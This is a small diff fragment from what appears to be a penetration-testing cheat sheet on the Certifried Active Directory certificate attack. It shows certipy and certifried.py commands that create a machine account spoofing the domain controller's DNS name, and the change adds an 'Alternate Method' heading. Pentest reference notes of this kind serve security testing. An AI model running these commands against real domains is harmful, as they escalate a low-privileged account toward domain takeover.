@@ -26,6 +26,8 @@
 
  - certipy account create -u "$USER"@"$DOMAIN" -p "$PASSWORD" -user "$COMPUTER_NAME" -pass "$COMPUTER_PASS" -dns "$DC_NAME.$DOMAIN"
 
+## Alternate Method
+
 #### 1) Request certificate manually
 
  - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 (Add the computer and update necessary attributes)
